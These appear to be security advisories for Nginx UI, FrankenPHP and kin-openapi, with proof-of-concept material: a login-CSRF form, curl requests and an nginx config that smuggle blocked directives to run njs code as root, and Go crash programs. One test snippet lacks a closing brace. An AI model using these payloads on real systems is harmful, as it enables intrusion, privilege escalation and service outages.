### GHSA-44xr-mrhh-qm78 — Nginx UI: Casdoor SSO callback uses a constant `state` parameter (login CSRF)
- Aliases: CVE-2026-84312 | Published: 2026-10-15 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-287, CWE-352
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N`
- Affected Go/github.com/0xJacky/Nginx-UI: introduced:0 fixed:1.9.10-0.20260703131214-23d1934099b0

## Summary

In the Casdoor SSO flow, the OAuth `state` parameter is hard-coded to `settings.CasdoorSettings.Application` — a value identical for every user and every login. The callback handler accepts whatever `state` the client sends without comparing it to anything stored in the user agent, enabling a login-CSRF: an attacker can force the victim's browser to authenticate as the *attacker*.

## Details

`api/user/casdoor.go:92-117` (`GetCasdoorUri`):

```go
func GetCasdoorUri(c *gin.Context) {
    clientId := settings.CasdoorSettings.ClientId
    redirectUri := settings.CasdoorSettings.RedirectUri
    state := settings.CasdoorSettings.Application      // ← constant
    ...
    c.JSON(http.StatusOK, gin.H{
        "uri": fmt.Sprintf(
            "%s/login/oauth/authorize?client_id=%s&response_type=code&redirect_uri=%s&state=%s&scope=read",
            endpoint, clientId, encodedRedirectUri, state),
    })
}
```

`api/user/casdoor.go:24-90` (`CasdoorCallback`):

```go
type CasdoorLoginUser struct {
    Code  string `json:"code" binding:"required,max=255"`
    State string `json:"state" binding:"required,max=255"`
}

func CasdoorCallback(c *gin.Context) {
    var loginUser CasdoorLoginUser
    if !cosy.BindAndValid(c, &loginUser) { return }
    ...
    // state is NEVER compared to a per-session value
    token, err := casdoorsdk.GetOAuthToken(loginUser.Code, loginUser.State)
    ...
    u, err := user.GetUser(claims.Name)        // username from Casdoor's JWT
    ...
    userToken, err := user.GenerateJWT(u)       // JWT minted for whatever user came back
}
```

Compare with the OIDC implementation in `api/user/oidc.go:35-48`, which generates a random state, stores it in an `oidc_state` cookie, and validates it on the callback. Casdoor has no such check.

## Proof of Concept

1. Attacker initiates a Casdoor authorisation flow on their own browser, obtaining an authorisation `code` for *their* Casdoor account.
2. Attacker hosts a page that auto-submits the captured `code` to the victim's nginx-ui:

   ```html
   <html><body><form action="https://victim.example/api/casdoor_callback" method="POST"
                     enctype="text/plain" id="x">
     <input name='{"code":"<attacker_code>","state":"<App>","junk":"' value='"}'>
   </form>
   <script>document.getElementById('x').submit()</script>
   </body></html>
   ```

3. Server exchanges the attacker's `code`, looks up the username from `claims.Name` in the local user table, and mints a JWT for *that* row. The callback also sets the `_nginx_ui_secure_session` cookie via `middleware.EnsureSecureSessionCookie(c)` (`casdoor.go:84`) — meaning the victim is now silently authenticated as the attacker.
4. Victim, believing they are using their own account, configures sites / TLS keys; the attacker reads them.

## Impact

Login CSRF — the victim is forced to authenticate as the attacker, leading to data exfiltration of anything the victim subsequently uploads or configures. Particularly dangerous when nginx-ui is used by an organisation where Casdoor maps internal identities — the attacker can attribute their changes to the victim.

## Patches

Mirror the OIDC implementation:

```diff
+ import (
+    "crypto/rand"
+    "crypto/subtle"
+    "encoding/hex"
+    ...
+ )

 func GetCasdoorUri(c *gin.Context) {
     ...
-    state := settings.CasdoorSettings.Application
+    b := make([]byte, 16)
+    if _, err := rand.Read(b); err != nil {
+        cosy.ErrHandler(c, err); return
+    }
+    state := hex.EncodeToString(b)
+    c.SetSameSite(http.SameSiteLaxMode)
+    c.SetCookie("casdoor_state", state, 600, "/", "",
+                cSettings.ServerSettings.EnableHTTPS, true)
     ...
 }

 func CasdoorCallback(c *gin.Context) {
+    expected, err := c.Cookie("casdoor_state")
+    if err != nil {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"missing state cookie"}); return
+    }
     var loginUser CasdoorLoginUser
     if !cosy.BindAndValid(c, &loginUser) { return }
+    if subtle.ConstantTimeCompare([]byte(expected), []byte(loginUser.State)) != 1 {
+        c.AbortWithStatusJSON(http.StatusBadRequest,
+            gin.H{"message":"invalid state"}); return
+    }
     ...
 }
```

## Workarounds

Disable Casdoor SSO until patched. The OIDC integration in `api/user/oidc.go` is correctly implemented and can be used as a substitute.

## References

* [`api/user/casdoor.go:92-117`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/casdoor.go#L92-L117)
* [`api/user/casdoor.go:24-90`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/casdoor.go#L24-L90)
* [`api/user/oidc.go:35-48`](https://github.com/0xJacky/nginx-ui/blob/dev/api/user/oidc.go#L35-L48) (correct implementation for comparison)

### GHSA-cf23-7qxj-xmhr — Nginx UI: nginx config directive denylist (ValidateConfigFile) is bypassable via same-line ";" separation → authenticated directive injection (RCE on the official image)
- Aliases: CVE-2026-84316 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: HIGH
- CWE: CWE-184, CWE-20
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- Affected Go/github.com/0xJacky/Nginx-UI: introduced:0 fixed:1.9.10-0.20260703131214-23d1934099b0

## Summary
`config.ValidateConfigFile` is the security control that blocks dangerous nginx directives
(`js_*`, `perl_*`, `load_module` of njs/perl modules, `user root`). Its directive scanner is
bypassable: it splits the config by newlines and inspects only the FIRST token of each line, but
nginx separates directives with `;`, not newlines. Putting a benign directive first and the blocked
directive after a `;` on the SAME line defeats every check. The `include` directive is also not on
the denylist. As a result, an authenticated caller can inject the exact directives the hardening was
meant to block, through EVERY path that calls the validator — `POST /api/configs` (add), the REST
config modify endpoint (api/config/modify.go), the MCP `nginx_config_modify` tool, and the
site/stream save paths (internal/site/save.go, internal/stream/save.go). On deployments where
nginx has the njs/perl module (the official uozi/nginx-ui Docker image ships ngx_http_js_module.so),
this leads to code execution in the nginx worker; with `user root` the workers run as root.

This is distinct from the config_add gap (the MCP nginx_config_add tool not calling the validator at
all): here the validator IS called and still bypassed, so fixing config_add does not fix this.

## Root cause (internal/config/validation.go, ValidateConfigDirectives)
```go
for _, line := range bytes.Split(content, []byte("\n")) {          // splits on \n only
    trimmed := strings.TrimSpace(string(line))
    ...
    directive := firstDirectiveToken(trimmed)                      // first [a-zA-Z_]* of the line
    if directive == "user" && configuresRootWorkers(trimmed) { ... }     // keyed on first token
    if directive == "load_module" && loadsRestrictedDynamicModule(...) { ... } // keyed on first token
    if _, blocked := blockedConfigDirectives[directive]; blocked { ... }      // keyed on first token
}
```
nginx parses `a 1; b 2;` on one line as two directives, but this scanner only ever sees `a`.
`include` is absent from `blockedConfigDirectives`.

## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — VALIDATED paths only
Authenticated with a node secret (`X-Node-Secret`, from nginx-ui's first-boot log) or a user JWT.
Every step below hits a path that calls ValidateConfigFile.

1) Baseline — validator works on a plain line:
```
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"x.conf","base_dir":"","content":"js_import a.js;","overwrite":true}'
# -> 40017 "file content contains restricted nginx directive: js_import"   (REJECTED)
```

2) Create the njs module file via the VALIDATED REST add (JS source is not nginx directives, so it
   passes ValidateConfigContent):
```
poc.conf:
  import fs from 'fs';
  function pwn(r){ fs.writeFileSync('/tmp/NJS_VIA_DENYLIST_BYPASS.txt','denylist-bypass-rce-ok\n'); r.return(200,'pwned2\n'); }
  export default { pwn };
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"poc.conf","base_dir":"","content":"<the JS above>","overwrite":true}'   # ACCEPTED
```

3) Overwrite the main nginx.conf via the VALIDATED `nginx_config_modify` MCP tool, smuggling each
   blocked directive after a benign one on the SAME line (this is ACCEPTED by ValidateConfigFile):
```nginx
worker_processes 1; load_module /usr/lib/nginx/modules/ngx_http_js_module.so;
error_log /var/log/nginx/error.log notice; user root;
pid /run/nginx.pid;
events { worker_connections 1024; }
http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream; js_import poc from /etc/nginx/poc.conf;
    server { listen 8897; location = /pwn3 { js_content poc.pwn; } }
}
```

4) Reload. Result:
- `nginx -t` successful.
- worker `/proc/<pid>/status` → `Uid: 0 0 0 0` (root) — the blocked `user root` took effect.
- `GET http://127.0.0.1:8897/pwn3` → `pwned2` — js_content executed.
- `/tmp/NJS_VIA_DENYLIST_BYPASS.txt` created, owned by root → njs code execution as root.

(An MCP-over-SSE client for steps using nginx_config_modify is included in the config_add report as
`poc_mcp_client.py`; the same client drives this PoC. `X-Node-Secret` authenticates both REST and MCP.)

## Impact
Authenticated config-injection that defeats the directive-validation control on all guarded write
paths. On deployments with njs/perl available (the official Docker image ships ngx_http_js_module.so):
code execution in the nginx worker and, via `user root`, arbitrary file read/write as root (trivially
escalated to full host compromise). On stock nginx without those modules: reliable DoS (failed
reload) plus `user root` privilege regression.

## Honest scope / caveats
- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.
- What was live-verified: the bypass + full RCE on `POST /api/configs` (add) and the MCP
  `nginx_config_modify` tool. The other callers — REST config modify (api/config/modify.go), site
  save (internal/site/save.go), stream save (internal/stream/save.go) — invoke the SAME
  `ValidateConfigFile` (code-confirmed), so they are affected by construction; I did not individually
  live-test each.
- RCE is conditional on the njs/perl module being present; it ships in the official image, so the
  default Docker deployment is exploitable. On stock nginx without those modules the injected
  `load_module`/`js_*` make reload fail → DoS plus a `user root` privilege regression (inferred from
  nginx module behavior; not separately tested on a stock build).
- The `;` and `include` bypasses are fully confirmed live. A backslash line-continuation variant was
  accepted by the validator but its nginx parsing was not separately confirmed and is not relied on.
- "Full host compromise" describes the capability of root file read/write via njs `fs` (proven: a
  root-owned file was written); the subsequent authorized_keys/cron step is a well-known escalation,
  not something this PoC executed.

## Suggested fix
Do not hand-roll a newline/first-token denylist. Validate the way nginx parses: split statements on
`;` (and handle blocks, comments, line continuations), validate EVERY statement, block/limit
`include`, and recurse into included files — or validate via an allowlist and/or by running
`nginx -t` on the candidate before activating it.

## Dedup / novelty
Distinct from CVE-2026-33032 (unauthenticated MCP endpoint — an auth issue, now fixed) and from the
separately reported config_add validation gap (a missing validator call on one path). This is a
bypass of the validator itself, affecting every path that calls it; no existing CVE/GHSA covers it
(checked osv.dev and the GitHub advisory database for this repo). Appears novel.

References:
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-cf23-7qxj-xmhr [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-84316 [ADVISORY]
- https://github.com/0xJacky/nginx-ui/commit/23d1934099b05b2a01589b48129dc3d3159d91c2 [WEB]
- https://github.com/0xJacky/nginx-ui [PACKAGE]
- https://github.com/0xJacky/nginx-ui/releases/tag/v2.4.1 [WEB]

### GHSA-vc32-4gwf-77xp — Nginx UI: OTP secure-session step-up can be bypassed via MCP configuration tools
- Aliases: CVE-2026-84360 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: HIGH
- CWE: CWE-288
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`
- Affected Go/github.com/0xJacky/Nginx-UI: introduced:0 fixed:1.9.10-0.20260703131214-23d1934099b0

### Summary
An OTP-enabled authenticated user who cannot use the HTTP configuration mutation endpoints without a valid secure session can still mutate Nginx configuration through `/mcp` and `/mcp_message` using only ordinary authentication.

### Details
The HTTP configuration mutation surface is explicitly grouped behind `middleware.RequireSecureSession()`. By contrast, the MCP endpoints are exposed with only `middleware.AuthRequired()`. The MCP server exposes configuration mutation tools including `nginx_config_add` and `nginx_config_modify`, so OTP-enabled users gain an alternate path around the intended step-up requirement.

Relevant code paths:
- [api/config/router.go](/home/kali/Desktop/bounty/nginx-ui/api/config/router.go:14)
- [internal/middleware/secure_session.go](/home/kali/Desktop/bounty/nginx-ui/internal/middleware/secure_session.go:52)
- [mcp/router.go](/home/kali/Desktop/bounty/nginx-ui/mcp/router.go:9)
- [mcp/config/config_add.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_add.go:34)
- [mcp/config/config_modify.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_modify.go:55)

This is a security-control bypass rather than a missing feature. The product already established that OTP-enabled users should complete a secure session before high-impact configuration mutations are accepted on the HTTP path.

### PoC
I verified this locally in an isolated environment with a temporary end-to-end harness that exercised the real `/mcp` and `/mcp_message` routes.

What the executed test did:
1. Created a temporary config directory and configured Nginx control commands to harmless local values (`true`) to avoid touching the host.
2. Created a real OTP-enabled user in a temporary SQLite database.
3. Generated a real JWT for that OTP-enabled user.
4. Started a local test server exposing the real `/mcp` and `/mcp_message` routes.
5. Opened an authenticated SSE connection to `/mcp` with the JWT and no `X-Secure-Session-ID`.
6. Initialized the MCP session over `/mcp_message`.
7. Called the real `nginx_config_add` tool over `/mcp_message`.
8. Verified that the tool succeeded and created `mcp-bypass.conf` in the managed config directory without any secure-session step-up.

Observed result from the actual local verification:
- The MCP session initialized successfully without any `X-Secure-Session-ID`.
- The config file was written through the MCP tool path using only JWT authentication.

### Impact
OTP-enabled accounts lose the intended step-up protection for high-impact Nginx configuration changes when MCP is enabled. A user who should be blocked until re-authenticating can still create or modify configuration files and trigger reload behavior through MCP.

### GHSA-v3ph-cgqh-r8p5 — FrankenPHP: Cross-request PHP session ID leak in worker mode when the session extension is a shared module
- Aliases: CVE-2026-82416 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: HIGH
- CWE: CWE-362, CWE-488
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L`
- Affected Go/github.com/dunglas/frankenphp: introduced:0 fixed:1.12.5

## Summary
In worker mode under concurrency, FrankenPHP can hand a PHP session id from one request to another when PHP's `session` extension is loaded as a shared module instead of being statically linked into the FrankenPHP binary. A request presenting `Cookie: session=A` can have `session_id()` resolve to `B` (a different concurrent client's id) or to a stale id from a previous request served by the same worker thread.

## Impact
- **Security:** cross-user session exposure / session hijacking in worker mode. Same impact class as CVE-2026-24894.
- **Functional:** users are intermittently logged out; their cookie's session is ignored and they receive a foreign or empty session.

## Affected / not affected
Exposure is determined by how the `session` extension is linked in the PHP build FrankenPHP is compiled against, **not** by the FrankenPHP release:

- **Affected:** any build where the `session` extension is not visible to FrankenPHP at compile time, i.e. loaded as a shared / out-of-tree module (`extension=session` in an ini). This includes the RPM and Debian packages and other packaged `php-zts` distributions that ship `session` as a shared extension under `conf.d`.
- **Not affected:** builds where `session` is statically compiled into the PHP that FrankenPHP links against, such as the official static binaries and Docker images. There, the reset code below is compiled in and clears the id every request.

The C session-reset code is unchanged across 1.11.x-1.12.x, so this is not a code regression between releases. A "1.12.2 works / 1.12.3 leaks" observation on the same host reflects two differently-built packages, not a source change. The persistent-zval helpers (#2366) are compiled only under `FRANKENPHP_TEST` and are unrelated.

## Root cause
FrankenPHP resets per-request session state in `frankenphp_reset_session_state()`, which releases `PS(id)` so the next `session_start()` re-reads the request cookie. That whole function is guarded by `#ifdef HAVE_PHP_SESSION`, a macro defined only when the session extension headers are present at FrankenPHP compile time (session statically enabled in the PHP build). When `session` is a shared module, `HAVE_PHP_SESSION` is undefined, the reset is compiled out, and `PS(id)` survives the request boundary.

PHP's `session_start()` reads the request cookie only when `PS(id)` is `NULL` (`ext/session/session.c`, `try_find_session_id_in_cookies()`: `if (!PS(use_cookies) || PS(id)) return;`). With a stale `PS(id)`, the cookie is ignored and the worker reuses the previous request's id, exposing it to whichever client is served next.

## Reproduction
Minimal worker script (`index.php`):
```php
<?php
$handler = static function () {
    session_start();
    $sent = $_COOKIE['session'] ?? '(none)';
    $id   = session_id();
    header('Content-Type: text/plain');
    echo ($sent === '(none)' || $sent === $id) ? "OK   sent=$sent id=$id\n"
                                               : "LEAK sent=$sent id=$id\n";
    session_write_close();
};
while (\frankenphp_handle_request($handler)) {}
```
Run under worker mode with `num 2` (≥2 workers), `session.use_strict_mode=1`, on a PHP build where `session` is a shared module. Pre-create two valid sessions `A` and `B`, then fire concurrent requests alternating the two cookies:
```sh
seq 600 | xargs -P32 -I{} sh -c '
  c=$([ $(( {} % 2 )) -eq 0 ] && echo A || echo B);
  curl -s -H "Cookie: session=$c" http://127.0.0.1:8080/' | grep -c LEAK
```
On an affected build a large fraction of responses are `LEAK` (`session_id()` differs from the cookie sent, and `A` and `B` sometimes resolve to the same id). On a statically-linked build the count is always `0`.

## Fix
When `HAVE_PHP_SESSION` is undefined, FrankenPHP now resets the `session` module through the module registry on every worker request (its `RSHUTDOWN` releases `PS(id)`, `RINIT` re-initialises the globals), so the per-request cleanup always runs regardless of how the extension is linked. Statically-linked builds are unchanged and keep using `frankenphp_reset_session_state()`.

Verified on PHP 8.6-dev ZTS, 2 workers, `session.use_strict_mode=1`, 600 alternating-cookie concurrent requests: before the fix 519/600 leaked; after the fix 0/600. Statically-linked builds stayed at 0/600.

## Workarounds
- Use a FrankenPHP build with `session` statically compiled (official static binaries or Docker images).
- Or, in the worker loop, after `session_write_close()` call `session_id('')` so the next `session_start()` re-reads the request cookie (with `session.use_strict_mode=1`).

References:
- https://github.com/php/frankenphp/security/advisories/GHSA-v3ph-cgqh-r8p5 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-82416 [ADVISORY]
- https://github.com/php/frankenphp/pull/2523 [WEB]
- https://github.com/php/frankenphp/commit/be24d82531675f90862b8cde1e9fc7e9ee855aa5 [WEB]
- https://github.com/php/frankenphp [PACKAGE]
- https://github.com/php/frankenphp/releases/tag/caddy/v1.12.5 [WEB]

### GHSA-p6wj-qrr4-pgh5 — kin-openapi: Nil-pointer dereference panic in openapi3filter for OpenAPI 3.1 array schemas missing items
- Aliases: CVE-2026-97394 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: HIGH
- CWE: CWE-248, CWE-476
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Go/github.com/getkin/kin-openapi: introduced:0.136.0 fixed:0.143.0

### Summary

A nil-pointer dereference in `openapi3filter` lets any unauthenticated client crash a request handler with a single HTTP request against an OpenAPI **3.1** operation that declares `type: array` **without** `items`. OpenAPI 3.1 (JSON Schema 2020-12) permits omitting `items`, and `doc.Validate()` accepts such schemas with `Schema.Items == nil`. Request/response decoders then dereference `Items` with no nil check. The panic is **deterministic (100%)** on every request to the affected operation. There is no `recover()` in `openapi3filter`; under handlers without per-request recover the process can exit.

### Details

**Spec-validation asymmetry.** OpenAPI 3.0 rejects array schemas that omit `items` ([`openapi3/schema.go`](https://github.com/getkin/kin-openapi/blob/master/openapi3/schema.go) around the `TypeArray` / `newSchemaItemsRequired` branch). For OpenAPI 3.1, `T.Validate` enables `jsonSchema2020ValidationEnabled`, so that check is skipped and `Schema.Items` remains nil after a clean `doc.Validate()`.

**Vulnerable decoder.** The primary request-side crash is in [`UrlencodedBodyDecoder`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go) (still present on this checkout at L1421):

```go
case propType.Is("array"):
    items := propSchema.Value.Items.Value  // Items == nil → panic
```

This runs during schema inspection **before** form values are parsed. Any non-empty `application/x-www-form-urlencoded` body for the operation reaches the dereference (an empty body is rejected earlier when `requestBody.required` is true, and never enters the decoder).

The same nil `Items` also crashes:

| Path | Location | Trigger |
|---|---|---|
| `MultipartBodyDecoder` | `req_resp_decoder.go` ~1564 → 1579 | `multipart/form-data` part named like the array property |
| `parseArray` → `parsePrimitive` | `req_resp_decoder.go` ~1129 / 1151 | Array-typed **response headers** via `ValidateResponse`, and path/cookie array params |

`Middleware` / `ValidationHandler` call `ValidateRequest` / `ValidateResponse` directly with no recover, so the panic escapes the library into the application.

**Recommended fix.** Guard nil `Items` and return a structured decode/validation error, e.g.:

```diff
 case propType.Is("array"):
+	if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil {
+		return nil, fmt.Errorf("unsupported schema of request body's property %q: array items required for decoding", propName)
+	}
 	items := propSchema.Value.Items.Value
```

Apply equivalent guards in `MultipartBodyDecoder` and `parseArray` before calling `parsePrimitive`.

### PoC

Verified against revision `c11a4812ba7be3ee3d81453be0c397ee84c238d5`, Go 1.25, `darwin/arm64`.

**1. Spec** — OpenAPI 3.1 operation with urlencoded body and `type: array` property without `items`:

```yaml
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
```

**2. E2E program** — `net/http` server using the same public entrypoint (`gorillamux` → `openapi3filter.ValidateRequest`) real middleware uses. Save as `main.go` in a module that depends on `github.com/getkin/kin-openapi` at a vulnerable revision, then `go run .`:

```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(spec))
	if err != nil {
		log.Fatal(err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		log.Fatalf("doc.Validate rejected (unexpected for 3.1): %v", err)
	}
	fmt.Println("SPEC_ACCEPTED; Items ==", doc.Paths.Value("/f").Post.RequestBody.Value.
		Content.Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value.Items)

	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		log.Fatal(err)
	}

	// Direct call (no net/http recover): proves the library itself panics.
	req, _ := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pp, _ := router.FindRoute(req)
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("DIRECT_PANIC: %v\n", r)
			}
		}()
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pp, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		fmt.Println("DIRECT_PANIC: none (unexpected)")
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		route, pathParams, err := router.FindRoute(r)
		if err != nil {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	addr := "127.0.0.1:8085"
	fmt.Printf("listening on http://%s/f\n", addr)
	fmt.Println("attack: curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://" + addr + "/f")
	log.Fatal(http.ListenAndServe(addr, mux))
}
```

**3. Observed output** (`go run .`):

```
SPEC_ACCEPTED; Items == <nil>
DIRECT_PANIC: runtime error: invalid memory address or nil pointer dereference
listening on http://127.0.0.1:8085/f
```

Then:

```
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://127.0.0.1:8085/f
```

Server log:

```
http: panic serving 127.0.0.1:…: runtime error: invalid memory address or nil pointer dereference
… openapi3filter.UrlencodedBodyDecoder …/req_resp_decoder.go:1421
… openapi3filter.ValidateRequest …
```

Stack pins the fault to `UrlencodedBodyDecoder` at `req_resp_decoder.go:1421`, called from `ValidateRequest` → `ValidateRequestBody` → `decodeBody`.

**Attack request:**

```
POST /f HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

tags=a
```

(Any non-empty body is enough; form content is irrelevant because `Items` is dereferenced during schema inspection before parsing.)

**4. Regression / multi-surface test suite** — save as e.g. `openapi3filter/array_items_nil_panic_test.go` in a checkout of the module and run `go test -run TestArrayItemsNilPanic ./openapi3filter/ -v`:

```go
package openapi3filter_test

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const urlencodedSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const urlencodedSpec30 = `
openapi: 3.0.3
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const multipartSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /upload:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const responseHeaderSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /hdr:
    get:
      responses:
        '200':
          description: ok
          headers:
            X-Tags:
              schema: {type: array}
`

func catchPanic(fn func()) (panicValue any) {
	defer func() { panicValue = recover() }()
	fn()
	return nil
}

func TestArrayItemsNilPanic_OpenAPI31Accepts(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	schema := doc.Paths.Value("/f").Post.RequestBody.Value.Content.
		Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value
	require.True(t, schema.Type.Is("array"))
	require.Nil(t, schema.Items)
}

func TestArrayItemsNilPanic_OpenAPI30Rejects(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec30))
	require.NoError(t, err)
	require.Error(t, doc.Validate(loader.Context))
}

func TestArrayItemsNilPanic_UrlencodedValidateRequest(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	req, err := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
	})
	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_MultipartValidateRequest(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(multipartSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	require.NoError(t, w.WriteField("tags", "a"))
	require.NoError(t, w.Close())

	req, err := http.NewRequest(http.MethodPost, "/upload", &buf)
	require.NoError(t, err)
	req.Header.Set("Content-Type", w.FormDataContentType())
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})

	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_ResponseHeaderValidateResponse(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(responseHeaderSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	req, err := http.NewRequest(http.MethodGet, "/hdr", nil)
	require.NoError(t, err)
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateResponse(loader.Context, &openapi3filter.ResponseValidationInput{
			RequestValidationInput: &openapi3filter.RequestValidationInput{
				Request: req, PathParams: pathParams, Route: route,
				Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
			},
			Status: http.StatusOK,
			Header: http.Header{"X-Tags": []string{"a,b"}},
			Body:   io.NopCloser(strings.NewReader("")),
		})
	})
	require.NotNil(t, got)
	require.Contains(t, fmt.Sprint(got), "nil pointer dereference")
}

func TestArrayItemsNilPanic_E2EHTTPServer(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	var panicCount int
	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if recover() != nil {
				panicCount++
				http.Error(w, "panic in ValidateRequest", http.StatusInternalServerError)
			}
		}()
		route, pathParams, err := router.FindRoute(r)
		require.NoError(t, err)
